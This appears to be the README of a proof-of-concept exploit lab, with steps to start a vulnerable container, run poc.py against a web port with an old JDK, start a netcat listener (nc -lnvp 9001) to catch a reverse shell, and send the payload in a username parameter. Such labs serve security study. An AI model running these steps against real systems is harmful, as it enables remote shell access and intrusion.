# Installation

```
docker-compose up -d
```

# Exploit

1. Install the requirements.
```
pip install -r requirements.txt
```

2. Install the JDK jdk1.8.0_20 into the same directory and run the exploit.
```
# JDK must be present in the same directory as that of PoC
python3 poc.py --userip localhost --webport 8000 --lport 9001
```

3. Start the netcat listner.

```
nc -lnvp 9001
```

4. Send the Payload in the username parameter
